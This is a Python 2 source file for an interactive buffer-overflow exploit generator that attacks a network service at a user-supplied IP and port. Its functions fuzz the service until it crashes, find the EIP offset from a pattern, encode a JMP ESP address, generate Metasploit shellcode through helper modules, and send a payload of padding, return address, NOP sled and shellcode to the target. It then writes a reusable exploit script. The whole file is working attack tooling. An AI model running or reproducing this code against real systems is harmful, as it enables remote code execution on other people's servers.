#!/usr/bin/env python2


import random
import string
import socket 
import time
import fileinput
from Banner import *
import shutil
import os
import sys
from subprocess import check_output 


W='\033[0m'     
R='\033[31m'    
G='\033[0;32m'  
O='\33[37m'     
B='\033[34m'    
P= '\033[35m'   
Y="\033[1;33m" 
try:  
   if sys.argv[0] and '-c' in sys.argv[1] and  len(sys.argv[1])==2\
   and'off' in sys.argv[2] and\
   len(sys.argv[2])==3 :
      W = ''     
      R = ''    
      G = ''  
      O = ''     
      B = ''    
      P = ''   
      Y = ''   
   else: 
       print 'Plsase set color to off'
       exit()
except IndexError:
          try:
            if sys.argv[1]:
               print 'Plsase set color to off'
               exit()  
          except IndexError:
               pass  

class SERVERSOCKET():
     
     def __init__(self):

            with open('shell_code.py','w') as shell_code:
                shell_code.write('# pls add your shellcode '+'\n'+'shell_code =()') 	
            mode = """
            ========================                          
             Target Server Socket
            ========================
           """
            print P+mode+W
            self.app_name = str(raw_input(O+"\n[+] "+W+P+"application name : "+W))
            self.ip_port()
            self.Fuzzing__()
            self.string_ramdon()
            self.connect_servser()
            self.Option_return()
            self._hexadecimal() 
            self.little_endian() 
            self.import_char()                   
            self.attack_all()
            self.auto_write()
           
     def ip_port(self):
            try:
                self.server_ip=str(raw_input(O+"\n[+] "+W+B+"Server Ip : "+W))
                time.sleep(2)
                self.server_port=int(raw_input(O+"\n[+] "+W+B+"Server Port : "+W)) 
            except Exception:
                print Y+"\n\r\r!---___"+W+R+ "Please Chech ip and the port"+W+Y+'___---!'+W 
                return  self.ip_port()    
            except KeyboardInterrupt:
                print Banner
                exit()
                				
     def Fuzzing__(self): 
    				
          try:                  
                self.Fuz_skip = 's'.lower() 
                self.Fuz_OPt  = "y".lower()  
                time.sleep(2)           
                print O+"\n+++"+W+R+" Fuzzing Option "+W+O+'+++'+W+'\n'+Y+('='*25)+W
                time.sleep(2) 
                self.Fuzzing_in = str(raw_input(O+"\n[$] "+W+B+"Start Fuzzing Enter " +W+Y+"'Y'" +W+B+ " skip Enter " +W+Y+"'S'"+W+B+' : '+W))               
                if self.Fuzzing_in ==self.Fuz_skip and len(self.Fuzzing_in)==1:
                     pass
                
                elif self.Fuzzing_in ==self.Fuz_OPt and len(self.Fuzzing_in)==1:
                    String = "A"
		    Fuzzer = 100
		    print O+"\n>>>>"+W+R+"Fuzzing in process "+W 		    
		    try:
		          try:
		              while True: 
		                    Fuzzing_sock=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
			            Fuzzing_sock.settimeout(2)
				    Fuzzing_sock.connect((self.server_ip,self.server_port))
				    Fuzzing_sock.recv(1023)	       	      
				    Buffer=String*Fuzzer
				    Fuzzing_sock.send(Buffer+'\n\r')
				    time.sleep(1)
				    Fuzzing_sock.close()
				    length=(int(len(Buffer)))
				    Fuzzer +=100
				    print B+"###--> "+W,Fuzzer-100   
                                    sys.stdout.write('\x1b[1A')
                                    sys.stdout.write('\x1b[2K')
			  except:
		             if  Fuzzer > 100:                           
                                 print O+"\n>>>>>"+W+P+"Fuzzing Stop at " +W+Y+str(length)+W+ R+ " Characters"+W 
                             else:
                               print Y+"\n\r\r!---___"+W+R+ "String Pattern NOT Generated"+W+Y+'___---!'+W
                               time.sleep(1)
                               print Y+"\n\r\r!---___"+W+R+ "service not repoinding "+W+Y+'___---!'+W
                               time.sleep(1)
                               self.ip_port()
                               self.Fuzzing__()  
		    except NameError:
                             print O+"\n***_***_"+W+R+"[::"+W+Y+"Fuzzing NOT Start"+W+R+"::'Connection Error :::::']"+W+O+"***_***"+W
                             try:
			       self.ip_port()
			       self.Fuzzing__()
			     except:
			          self.string_ramdon()
			          	
	            try:
                        print Y+"\n\r\r!---___"+W+R+ "Buffer OverFlow discover"+W+Y+'___---!'+W 
                        input= raw_input(O+"\n\t\t!_________application  not repoinding restart then Press any key to Continue________! \n"+W)
                    except NameError:
                           pass	                                          
                    self.Random_String = "".join(random.choice(string.ascii_letters)for i in range(int(length) )).lower()  
                    self.Random_String = bytearray(self.Random_String)
                    time.sleep(2)
                    print Y+"\n\r\r!---___"+W+R+ "String Pattern is Generated in length : "+W,len(self.Random_String)
                    time.sleep(2)  
                    if self.Random_String  > 0:
                           self.connect_servser() 
                           self.Option_return()
                           self._hexadecimal()
                           self.little_endian() 
                           self.import_char()                                   
                           self.attack_all()
                           self.auto_write()
                                                                                                                                                                                                             
	        else:         
	           time.sleep(2)    
                   print Y+"\n[-] "+W+R+"please Enter "+W+B+"'Y'"+W+R+"or"+W+B+"'S'"+W+Y+" [-]"+W 
                   return self.Fuzzing__()             
          except KeyboardInterrupt:
                    print  Banner
                    exit()
     def string_ramdon(self):        
             try:                      
	 	    Requst_String = int (raw_input(O+"\n[+] "+W+B+"Enter the length of Pattern :"+W))
		    time.sleep(2)
		    self.Random_String = "".join(random.choice(string.ascii_letters)for i in range(Requst_String )).lower()  
                    self.Random_String = bytearray(self.Random_String)
		    print Y+"\n[+]"+W+R+"String Pattern is Generated in length :"+W,len(self.Random_String )#,"\n\n",(self.Random_String).strip()
             except Exception:
                    time.sleep(2)
                    print Y+"\n[()]"+W+R+"Check input integer Required"+W+Y +"[()]"+W
                    return self.string_ramdon()		 
             except KeyboardInterrupt:
                    print  Banner
                    exit()                 		 
 
     def connect_servser(self):
       
          while True:
	       try:
	            socket_1= socket.socket(socket.AF_INET,socket.SOCK_STREAM)
		    socket_1.connect((self.server_ip,self.server_port))
		    socket_1.settimeout(3)
		    data = socket_1.recv(1023)
		    if socket_1.send( self.Random_String +'\r\n'):
		       time.sleep(2)	      	      
                       print Y+"\n\r\r!---___"+W+R+ "Data Send Successful"+W+Y+'___---!'+W
		       socket_1.close()
		       break 
	            else:
	                  print Y+"\n[(!)]"+W+R+" Connection is Down Socket.Error"+W+Y+"[(!)]"+W
	                  time.sleep(2)
	                  return self.ip_port()
	       except socket.error, exc:
                    print Y+"\n\r\r!---___"+W+P+ "Socket.Error "+W+O+"%s " %exc+W+Y+'___---!'+W
		    self.ip_port()
		    continue
               except KeyboardInterrupt:
                    print  Banner
                    exit()
     def Option_return(self):
       
           try:
               continue_1   = "c".lower()            
               return_back  = "b".lower()
               op_sel = str(raw_input(O+"\n[*] "+W+B+"To Continue Press "+W+R+"C "+W+B +"To Return Back Press "+W+R+" B : "+W)).lower()
               if op_sel== continue_1 and  len(op_sel)==1:
                    pass
                    
               elif op_sel ==return_back and len(op_sel)==1:
                    self.string_ramdon()
                    self.connect_servser()
                    self.Option_return()
               else:
                  print Y+"\n[-]"+W+R+"Please Enter "+W+B+"C"+W+R+"or"+W+B+" B"+W+Y+" [-]"+W 
                  self.Option_return()
           except KeyboardInterrupt:
                   print  Banner
                   exit()
                               
     def _hexadecimal(self):                                                                                    
            while True:
                 try:
                    try:
                        banner = """                           
                             CRACH  ADDRESS
                        ========================
                        """
                        print P+banner+W 
                        time.sleep(1)                    
		        self.hexadecimal =str(raw_input(O+"\n[+]"+W+B+"Enter Hexadecimal Crach address: "+W)).upper()
                        self.ASCII1 ="".join(reversed([self.hexadecimal[i:i+2] for i in range(0, len(self.hexadecimal), 2)]))                
		        self.ASCII = ''.join(chr(int(self.ASCII1[i:i+2], 16)) for i in range(0, len(self.ASCII1), 2))
		        if  self.ASCII in  self.Random_String and len(self.ASCII)==4:
		          time.sleep(2)
		          print Y+"\n[+] "+W+P+"The ASCII Value  is "+W+B+": "+W,R+self.ASCII+W
		          time.sleep(2)
		          self.location = self.Random_String.find(self.ASCII)		       
		          print Y+"\n[+] "+W+P+"Exact Satch at Offset"+W+B+" : "+W,self.location	              
                          break
                             
		        else:
                            print Y+"\n\r\r!---___"+W+R+ "THE VALUE  OF THE ADDRESS Not FOUND  IN OUR STRING"+W+Y+'___---!'+W
	                    time.sleep(2)
	                    return self._hexadecimal() 
	                
	            except Exception:
                       print Y+"\n\r\r!---___"+W+R+ "THE VALUE  OF THE ADDRESS Not FOUN"+W+Y+'___---!'+W                        
	               return self._hexadecimal()                  		    	        
                 except KeyboardInterrupt:
                       print  Banner
                       exit()
     def import_char(self): 
         try:            
            banner = """                           
                   BAD_CHARACTER
             ========================
                    """
            print P+banner+W 
            time.sleep(1)
            Bad = "yes".lower()
            Bad_no = "no".lower()                 
            bad_op = str(raw_input(Y+"\n[+] "+W+R+"Test Bad_Character Enter "+W+B+"yes "+W+R +"Skip Enter "+W+B+" no : "+W)).lower()            
            if bad_op == Bad and len(Bad)==3: 
                banner = """  
                    ========================                          
                      Bad_Character start
                    ======================== 
                    """
                print P+banner+W 
                with open('.data','w')as data :
                    data1 = data.write(self.server_ip+'\n'+str(self.server_port)+'\n'+str(self.location))         
                time.sleep(2)
                from Bad_Character import Bad_Character             
                run = Bad_Character()
                from Msf_Helper  import Msf_Helper
                go = Msf_Helper()
            elif bad_op ==Bad_no and len(Bad_no)==2: 
                ok = 'yes'.lower()
                no = 'no'.lower()
                opt_code = str(raw_input(O+"\n[$] "+W+B+"Generate ShellCode and Listner " +W+Y+"'Yes'" +W+B+ " skip Enter " +W+Y+"'no'"+W+B+' : '+W)).lower()
                if opt_code == ok and len(opt_code)==3 :		              
                    banner = """                           
                      SCHELLCODE & LISTNER
                    ======================== 
                         """
                    print B+banner+W 
                    time.sleep(1)
                    self.badchar =str(raw_input(O+"[+] "+W+B+"Enter bad_Charater : "+W))
                    host_ip   = check_output(['hostname', '--all-ip-addresses']).decode('utf8').replace('\n','')
                    with open('.data','w')as data :
                         data1 = data.write(self.badchar+'\n'+host_ip.replace(' ','\n'))
                    from Msf_Helper  import Msf_Char_NO
                    go = Msf_Char_NO()
                elif opt_code == no and len(opt_code)==2 :                     
                    stop  = str(raw_input(R+"\n\t\t!___To Continue Exploit Generate shellcode and post it in shell_code.py file___! \n"+W ))     
                    pass
            else:
              print Y+"\n[-]"+W+R+"Please Enter "+W+B+"yes"+W+R+" or"+W+B+" no"+W+Y+" [-]"+W 
              self.import_char()                   
         except KeyboardInterrupt:
                print  Banner
                exit()          
         
     def little_endian(self):       
               try:
                    banner = """                           
                           JMP ADDRESS
                     ======================== 
                                """
                    print B+banner+W 
                    time.sleep(1)
                    jump= str(raw_input(O+"\n[+]"+W+B+" Enter JMP ESP addrsss HEX  : "+W)).upper()
                    if len(jump) < 4 :
                        print Y+"\n[+] "+W+R+"JMP ESP is Required "+W 
	                return self.little_endian()  
	            else:
	               pass             
                    time.sleep(2)
                    self.jump_address = "".join(reversed([jump[i:i+2] for i in range(0, len(jump), 2)]))
                    self.display =self.jump_address# for print olnly
                    self.display = " ".join('\\x%s'%self.display[i:i+2] for i in range(0, len(self.display), 2))
                    self.display= self.display.replace(" ", "")
                    time.sleep(2)
                    self.jump_address = ('0'*(len(self.jump_address) % 2) +self.jump_address).decode('hex') 
                    print Y+"\n[+] "+W+P+"little endian JMP ESP  is "+W+B+" : "+W,R+self.display+W
                   
               except Exception: 
                       print Y+"\n\r\r!---___"+W+R+ "TypeError: Non-hexadecimal digit found"+W+Y+'___---!'+W
	               return self.little_endian()                       
               except KeyboardInterrupt:
                    print  Banner
                    exit()
                                
     def attack_all(self):
	       from shell_code import shell_code   		       
	       try: 
                   banner = """                           
                           ATTACK START
                    ======================== 
                    """                   
                   print P+banner+W 
                   time.sleep(1)	                      
                   socket_2 =socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                   Start_string = self.location*"A"        
                   self.NO_Operation = len(self.Random_String) - self.location  - len( self.jump_address)
                   self.NO_Operation =self.NO_Operation*"\x90"
                   self.count = self.NO_Operation.count("\x90")    
                   attack = Start_string+self.jump_address+ self.NO_Operation +str(shell_code)
                   time.sleep(2)
                   print Y+'\n[+] '+W+B+' attack'+W+O+' ='+W,len(Start_string),B+'of'+W+R+ " A "+W+O+' + '+W+B+\
                   ' JMP ESP ='+W,Y+ self.display+W ,O+'+'+W,self.NO_Operation.count("\x90"),B+'of'+W+R+'("\\x90")'+W+O +'+'+W+P+' shell code'+W
                   time.sleep(2)
                   print Y+"\n[+] "+W+R+"Conncet Server Ip "+W+O+ " : "+W, P+self.server_ip+W
                   time.sleep(2)
                   print Y+"\n[+] "+W+R+"Conncet Server Port "+W+O+"  : "+W, self.server_port
                   socket_2.settimeout(8)  
                   socket_2.connect((self.server_ip,self.server_port))      
                   time.sleep(2) 
                   self.data_recv  = socket_2.recv(1024)
                   if socket_2.send( attack + '\r\n'):                        
                         if len(shell_code) < 50:
                                 print P+"\n\t\t\t\t!__________________EXPLOIT__Fail__________________!"+W
                                 print B+"\n\t\t\t!__________________Dedicated  No Shell Code______________________!"+W
                                 exit()
                         print B +"\n[+]"+W+R+"WE READY TO ATTACK !!"+W+B+"[+]"+W 
                         time.sleep(2)     
                         print R+"\n\t\t\t!__________________EXPLOIT__SACUSSED__________________!"+W 
                         socket_2.close()
               except socket.error, exc :                        
                         print Y+"\n\r\r!---___"+W+P+ "application  not repoinding Socket.Error "+W+O+"%s" %exc+W+Y+'___---!'+W     
                         time.sleep(2)  
                         self.little_endian()        
                         self.attack_all()
               except KeyboardInterrupt:
                   print  Banner
                   exit()  
                   
     def auto_write(self): 
	        from shell_code import shell_code      	     
                try:                
                  shell =str(shell_code).encode("hex")
                  shell1= "".join("\\x%s"%shell[i:i+2] for i in range(0, len(shell), 2))
                  self.shell_code= "".join('\n"%s"'%shell1[i:i+56] for i in range(0, len(shell1),56))
                  copy_format= shutil.copy("./TemplateExploit/payload1.txt",'./ExploitStore/'+self.app_name+"_Exploit.py")
                     
                  file= './ExploitStore/'+self.app_name+"_Exploit.py"
                  for line in fileinput.FileInput(file,inplace=1):
	                if '# application name :'in line:
		            line = line.rstrip()
		            line = line.replace(line,line+ self.app_name +'\n')				 
	                if '_Offset_Byte  =  "A"*'in line:
		            line = line.rstrip()
		            line = line.replace(line,line+ str(self.location)+'\n')				 
		        if '_JMP_ESP      ='in line:
		            line = line.rstrip()
		            line = line.replace(line,line+'"'+ self.display+'"'+'\n')				 
	                if '_NO_OPT       = "\\x90"'in line:
		            line = line.rstrip()
		            line = line.replace(line,line+ str(self.count) +'\n')
		        if '_Shell_Code   = ('in line:
		             line = line.rstrip()
		             line = line.replace(line,line+ self.shell_code+ ')'+'\n')			     
		        if 'ip_address ='in line:
		            line = line.rstrip()
			    line = line.replace(line,line+'"'+self.server_ip+'"'+"\n")				 
		        if 'connect_Port ='in line:
		            line = line.rstrip()
		            line = line.replace(line,line+ str(self.server_port)+'\n')  
					   
		        print line,
		        
                  time.sleep(2)		
		  print O+"\n\t!_________The Final Process of this Exploit Written in to "+W,Y+"'ExploitStore'"+W,O+"Folder________!"+W
		  time.sleep(2)     
                  print   Banner
                  exit() 
                except KeyboardInterrupt:    
                     print Banner                              	
                     exit()		          
if __name__ == '__main__':
   SERVERSOCKET()

